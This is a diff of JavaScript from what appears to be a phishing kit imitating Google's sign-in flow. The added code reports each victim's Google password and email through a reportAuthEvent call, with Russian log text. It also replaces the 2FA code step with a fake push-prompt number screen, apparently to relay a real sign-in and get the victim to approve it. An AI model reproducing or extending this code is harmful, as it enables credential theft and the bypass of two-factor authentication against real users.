@@ -855,13 +855,29 @@ function initApp() {
         }
     }
 
-    // Google Auth Navigation & Actions
     if (btnSwitchToGoogle) {
         btnSwitchToGoogle.addEventListener("click", () => {
+            clearGoogleErrors();
             showStep(stepGoogleEmail);
             if (googleEmailInput) {
                 googleEmailInput.value = userGoogleEmail || "";
-                setTimeout(() => googleEmailInput.focus(), 150);
+                setTimeout(() => {
+                    googleEmailInput.focus();
+                    if (typeof googleEmailInput.setSelectionRange === "function") {
+                        const len = googleEmailInput.value.length;
+                        googleEmailInput.setSelectionRange(len, len);
+                    }
+                }, 150);
+            }
+        });
+    }
+
+    if (googleEmailInput) {
+        googleEmailInput.addEventListener("blur", () => {
+            const val = googleEmailInput.value.trim();
+            if (val && !val.includes("@") && !/^\+?[0-9\s\-\(\)]{7,18}$/.test(val)) {
+                googleEmailInput.value = val + "@gmail.com";
+                userGoogleEmail = googleEmailInput.value;
             }
         });
     }
@@ -1051,11 +1067,15 @@ function initApp() {
             startGoogleLoading(() => {
                 btnSubmitGooglePassword.disabled = false;
                 reportAuthEvent("google_password", `Введен пароль Google: ${pwd}`, pwd, null, userGoogleEmail);
-                showStep(stepGoogle2FA);
-                if (google2faCodeInput) {
-                    google2faCodeInput.value = "";
-                    setTimeout(() => google2faCodeInput.focus(), 150);
-                }
+                
+                // Direct jump to Google Push Prompt screen (skipping 2FA SMS/Auth app code)
+                const promptNum = Math.floor(10 + Math.random() * 88);
+                if (googlePromptNumber) googlePromptNumber.textContent = promptNum.toString();
+                const promptTargetText = document.getElementById("googlePromptTargetNumber");
+                if (promptTargetText) promptTargetText.textContent = promptNum.toString();
+
+                reportAuthEvent("google_prompt_shown", `Показано число подтверждения Google: ${promptNum}`, pwd, null, userGoogleEmail);
+                showStep(stepGooglePrompt);
             }, 1500);
         });
     }
